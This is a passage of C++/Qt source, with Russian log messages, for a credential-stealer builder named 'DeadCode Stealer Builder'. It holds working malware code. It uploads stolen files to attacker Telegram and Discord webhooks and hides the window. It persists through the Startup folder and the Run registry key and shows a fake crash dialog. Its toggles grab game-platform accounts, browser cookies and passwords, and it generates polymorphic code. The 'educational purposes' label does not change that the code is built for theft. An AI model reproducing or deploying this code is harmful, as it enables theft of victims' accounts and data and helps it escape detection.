        if (doc["ok"].toBool()) {
            emitLog("Данные успешно отправлены в Telegram\n");
        } else {
            emitLog("Ошибка Telegram API: " + QString::fromStdString(doc["description"].toString().toStdString()) + "\n");
        }
    }

    curl_mime_free(form);
    curl_easy_cleanup(curl);
}

void MainWindow::sendToDiscord(const std::string& filePath)
{
    if (config.discordWebhook.empty()) {
        emitLog("Ошибка: Вебхук Discord не указан\n");
        return;
    }

    CURL *curl = curl_easy_init();
    if (!curl) {
        emitLog("Ошибка: Не удалось инициализировать libcurl\n");
        return;
    }

    curl_mime *form = curl_mime_init(curl);
    curl_mimepart *field = curl_mime_addpart(form);
    curl_mime_name(field, "file");
    curl_mime_filedata(field, filePath.c_str());

    field = curl_mime_addpart(form);
    curl_mime_name(field, "content");
    curl_mime_data(field, "Stolen data", CURL_ZERO_TERMINATED);

    curl_easy_setopt(curl, CURLOPT_URL, config.discordWebhook.c_str());
    curl_easy_setopt(curl, CURLOPT_MIMEPOST, form);

    std::string response;
    curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, WriteCallback);
    curl_easy_setopt(curl, CURLOPT_WRITEDATA, &response);

    CURLcode res = curl_easy_perform(curl);
    if (res != CURLE_OK) {
        emitLog("Ошибка отправки в Discord: " + QString::fromStdString(curl_easy_strerror(res)) + "\n");
    } else {
        emitLog("Данные успешно отправлены в Discord\n");
    }

    curl_mime_free(form);
    curl_easy_cleanup(curl);
}

void MainWindow::saveConfig(const QString& fileName)
{
    QString path = fileName.isEmpty() ? QFileDialog::getSaveFileName(this, "Сохранить конфигурацию", "", "Config Files (*.ini)") : fileName;
    if (path.isEmpty()) return;

    QSettings settings(path, QSettings::IniFormat);
    settings.setValue("discord", config.discord);
    settings.setValue("steam", config.steam);
    settings.setValue("steamMAFile", config.steamMAFile);
    settings.setValue("epic", config.epic);
    settings.setValue("roblox", config.roblox);
    settings.setValue("battlenet", config.battlenet);
    settings.setValue("minecraft", config.minecraft);
    settings.setValue("cookies", config.cookies);
    settings.setValue("passwords", config.passwords);
    settings.setValue("screenshot", config.screenshot);
    settings.setValue("fileGrabber", config.fileGrabber);
    settings.setValue("systemInfo", config.systemInfo);
    settings.setValue("socialEngineering", config.socialEngineering);
    settings.setValue("chatHistory", config.chatHistory);
    settings.setValue("telegram", config.telegram);
    settings.setValue("antiVM", config.antiVM);
    settings.setValue("fakeError", config.fakeError);
    settings.setValue("silent", config.silent);
    settings.setValue("autoStart", config.autoStart);
    settings.setValue("persist", config.persist);
    settings.setValue("sendMethod", QString::fromStdString(config.sendMethod));
    settings.setValue("buildMethod", QString::fromStdString(config.buildMethod));
    settings.setValue("telegramToken", QString::fromStdString(config.telegramToken));
    settings.setValue("chatId", QString::fromStdString(config.chatId));
    settings.setValue("discordWebhook", QString::fromStdString(config.discordWebhook));
    settings.setValue("filename", QString::fromStdString(config.filename));
    settings.setValue("encryptionKey1", QString::fromStdString(config.encryptionKey1));
    settings.setValue("encryptionKey2", QString::fromStdString(config.encryptionKey2));
    settings.setValue("encryptionSalt", QString::fromStdString(config.encryptionSalt));
    settings.setValue("iconPath", QString::fromStdString(config.iconPath));
    settings.setValue("githubToken", QString::fromStdString(config.githubToken));
    settings.setValue("githubRepo", QString::fromStdString(config.githubRepo));
    emitLog("Конфигурация сохранена: " + path + "\n");
}

void MainWindow::loadConfig()
{
    QString path = QFileDialog::getOpenFileName(this, "Загрузить конфигурацию", "", "Config Files (*.ini)");
    if (path.isEmpty()) return;

    QSettings settings(path, QSettings::IniFormat);
    config.discord = settings.value("discord", false).toBool();
    config.steam = settings.value("steam", false).toBool();
    config.steamMAFile = settings.value("steamMAFile", false).toBool();
    config.epic = settings.value("epic", false).toBool();
    config.roblox = settings.value("roblox", false).toBool();
    config.battlenet = settings.value("battlenet", false).toBool();
    config.minecraft = settings.value("minecraft", false).toBool();
    config.cookies = settings.value("cookies", false).toBool();
    config.passwords = settings.value("passwords", false).toBool();
    config.screenshot = settings.value("screenshot", false).toBool();
    config.fileGrabber = settings.value("fileGrabber", false).toBool();
    config.systemInfo = settings.value("systemInfo", false).toBool();
    config.socialEngineering = settings.value("socialEngineering", false).toBool();
    config.chatHistory = settings.value("chatHistory", false).toBool();
    config.telegram = settings.value("telegram", false).toBool();
    config.antiVM = settings.value("antiVM", false).toBool();
    config.fakeError = settings.value("fakeError", false).toBool();
    config.silent = settings.value("silent", false).toBool();
    config.autoStart = settings.value("autoStart", false).toBool();
    config.persist = settings.value("persist", false).toBool();
    config.sendMethod = settings.value("sendMethod", "Local File").toString().toStdString();
    config.buildMethod = settings.value("buildMethod", "Local Build").toString().toStdString();
    config.telegramToken = settings.value("telegramToken", "").toString().toStdString();
    config.chatId = settings.value("chatId", "").toString().toStdString();
    config.discordWebhook = settings.value("discordWebhook", "").toString().toStdString();
    config.filename = settings.value("filename", "DeadCode.exe").toString().toStdString();
    config.encryptionKey1 = settings.value("encryptionKey1", "").toString().toStdString();
    config.encryptionKey2 = settings.value("encryptionKey2", "").toString().toStdString();
    config.encryptionSalt = settings.value("encryptionSalt", "").toString().toStdString();
    config.iconPath = settings.value("iconPath", "").toString().toStdString();
    config.githubToken = settings.value("githubToken", "").toString().toStdString();
    config.githubRepo = settings.value("githubRepo", "").toString().toStdString();

    discordCheckBox->setChecked(config.discord);
    steamCheckBox->setChecked(config.steam);
    steamMAFileCheckBox->setChecked(config.steamMAFile);
    epicCheckBox->setChecked(config.epic);
    robloxCheckBox->setChecked(config.roblox);
    battlenetCheckBox->setChecked(config.battlenet);
    minecraftCheckBox->setChecked(config.minecraft);
    cookiesCheckBox->setChecked(config.cookies);
    passwordsCheckBox->setChecked(config.passwords);
    screenshotCheckBox->setChecked(config.screenshot);
    fileGrabberCheckBox->setChecked(config.fileGrabber);
    systemInfoCheckBox->setChecked(config.systemInfo);
    socialEngineeringCheckBox->setChecked(config.socialEngineering);
    chatHistoryCheckBox->setChecked(config.chatHistory);
    telegramCheckBox->setChecked(config.telegram);
    antiVMCheckBox->setChecked(config.antiVM);
    fakeErrorCheckBox->setChecked(config.fakeError);
    silentCheckBox->setChecked(config.silent);
    autoStartCheckBox->setChecked(config.autoStart);
    persistCheckBox->setChecked(config.persist);
    sendMethodComboBox->setCurrentText(QString::fromStdString(config.sendMethod));
    buildMethodComboBox->setCurrentText(QString::fromStdString(config.buildMethod));
    tokenLineEdit->setText(QString::fromStdString(config.telegramToken));
    chatIdLineEdit->setText(QString::fromStdString(config.chatId));
    discordWebhookLineEdit->setText(QString::fromStdString(config.discordWebhook));
    fileNameLineEdit->setText(QString::fromStdString(config.filename));
    encryptionKey1LineEdit->setText(QString::fromStdString(config.encryptionKey1));
    encryptionKey2LineEdit->setText(QString::fromStdString(config.encryptionKey2));
    encryptionSaltLineEdit->setText(QString::fromStdString(config.encryptionSalt));
    iconPathLineEdit->setText(QString::fromStdString(config.iconPath));
    githubTokenLineEdit->setText(QString::fromStdString(config.githubToken));
    githubRepoLineEdit->setText(QString::fromStdString(config.githubRepo));

    emitLog("Конфигурация загружена: " + path + "\n");
}

void MainWindow::exportLogs()
{
    QString path = QFileDialog::getSaveFileName(this, "Экспортировать логи", "", "Text Files (*.txt)");
    if (path.isEmpty()) return;

    QFile file(path);
    if (file.open(QIODevice::WriteOnly | QIODevice::Text)) {
        QTextStream out(&file);
        out << textEdit->toPlainText();
        file.close();
        emitLog("Логи экспортированы: " + path + "\n");
    } else {
        emitLog("Ошибка: Не удалось экспортировать логи\n");
    }
}

void MainWindow::exitApp()
{
    QApplication::quit();
}

void MainWindow::showAbout()
{
    QMessageBox::about(this, "О программе", "DeadCode Stealer Builder\nВерсия 1.0\nСоздано для образовательных целей.\nИспользуйте ответственно.");
}

void MainWindow::appendLog(const QString& message)
{
    QMutexLocker locker(&logMutex);
    textEdit->append(message);
}

void MainWindow::FakeError()
{
    MessageBoxA(NULL, "Critical Error: Application has encountered an unexpected error and will now close.", "Error", MB_ICONERROR | MB_OK);
}

void MainWindow::Stealth()
{
    ShowWindow(GetConsoleWindow(), SW_HIDE);
    HWND hwnd = GetForegroundWindow();
    ShowWindow(hwnd, SW_HIDE);
}

void MainWindow::Persist()
{
    char exePath[MAX_PATH];
    GetModuleFileNameA(NULL, exePath, MAX_PATH);
    std::string destPath = std::string(std::getenv("APPDATA")) + "\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\DeadCode.exe";
    try {
        std::filesystem::copy_file(exePath, destPath, std::filesystem::copy_options::overwrite_existing);
        emitLog("Программа добавлена в автозагрузку: " + QString::fromStdString(destPath) + "\n");
    } catch (const std::exception& e) {
        emitLog("Ошибка добавления в автозагрузку: " + QString::fromStdString(e.what()) + "\n");
    }

    HKEY hKey;
    if (RegOpenKeyExA(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS) {
        RegSetValueExA(hKey, "DeadCode", 0, REG_SZ, (BYTE*)exePath, strlen(exePath) + 1);
        RegCloseKey(hKey);
        emitLog("Программа добавлена в реестр автозагрузки\n");
    } else {
        emitLog("Ошибка добавления в реестр автозагрузки\n");
    }
}

void MainWindow::on_iconBrowseButton_clicked()
{
    QString fileName = QFileDialog::getOpenFileName(this, "Выбрать иконку", "", "Icon Files (*.ico)");
    if (!fileName.isEmpty()) {
        iconPathLineEdit->setText(fileName);
        config.iconPath = fileName.toStdString();
        emitLog("Выбрана иконка: " + fileName + "\n");
    }
}

void MainWindow::on_buildButton_clicked()
{
    if (isBuilding) {
        emitLog("Сборка уже выполняется. Пожалуйста, подождите.\n");
        return;
    }

    isBuilding = true;
    ui->statusbar->showMessage("Сборка началась...", 0);

    config.discord = discordCheckBox->isChecked();
    config.steam = steamCheckBox->isChecked();
    config.steamMAFile = steamMAFileCheckBox->isChecked();
    config.epic = epicCheckBox->isChecked();
    config.roblox = robloxCheckBox->isChecked();
    config.battlenet = battlenetCheckBox->isChecked();
    config.minecraft = minecraftCheckBox->isChecked();
    config.cookies = cookiesCheckBox->isChecked();
    config.passwords = passwordsCheckBox->isChecked();
    config.screenshot = screenshotCheckBox->isChecked();
    config.fileGrabber = fileGrabberCheckBox->isChecked();
    config.systemInfo = systemInfoCheckBox->isChecked();
    config.socialEngineering = socialEngineeringCheckBox->isChecked();
    config.chatHistory = chatHistoryCheckBox->isChecked();
    config.telegram = telegramCheckBox->isChecked();
    config.antiVM = antiVMCheckBox->isChecked();
    config.fakeError = fakeErrorCheckBox->isChecked();
    config.silent = silentCheckBox->isChecked();
    config.autoStart = autoStartCheckBox->isChecked();
    config.persist = persistCheckBox->isChecked();
    config.sendMethod = sendMethodComboBox->currentText().toStdString();
    config.buildMethod = buildMethodComboBox->currentText().toStdString();
    config.telegramToken = tokenLineEdit->text().toStdString();
    config.chatId = chatIdLineEdit->text().toStdString();
    config.discordWebhook = discordWebhookLineEdit->text().toStdString();
    config.filename = fileNameLineEdit->text().toStdString();
    config.encryptionKey1 = encryptionKey1LineEdit->text().toStdString();
    config.encryptionKey2 = encryptionKey2LineEdit->text().toStdString();
    config.encryptionSalt = encryptionSaltLineEdit->text().toStdString();
    config.iconPath = iconPathLineEdit->text().toStdString();
    config.githubToken = githubTokenLineEdit->text().toStdString();
    config.githubRepo = githubRepoLineEdit->text().toStdString();

    if (config.filename.empty()) {
        config.filename = "DeadCode.exe";
        fileNameLineEdit->setText("DeadCode.exe");
    }

    emitLog("Настройки обновлены. Начинается процесс сборки...\n");

    generatePolymorphicCode();
    generateBuildKeyHeader();
    copyIconToBuild();

    if (config.buildMethod == "Local Build") {
        buildTimer->start(100);
    } else if (config.buildMethod == "GitHub Actions") {
        triggerGitHubActions();
    }
}

void MainWindow::on_actionSaveConfig_triggered()
{
    saveConfig();
}

void MainWindow::on_actionLoadConfig_triggered()
{
    loadConfig();
}

void MainWindow::on_actionExportLogs_triggered()
{
    exportLogs();
}

void MainWindow::on_actionExit_triggered()
{
    exitApp();
}

void MainWindow::on_actionAbout_triggered()
{
    showAbout();
}

void MainWindow::replyFinished(QNetworkReply *reply)
{
    if (reply->error() != QNetworkReply::NoError) {
        emitLog("Сетевой запрос завершился с ошибкой: " + reply->errorString() + "\n");
    }
    reply->deleteLater();
}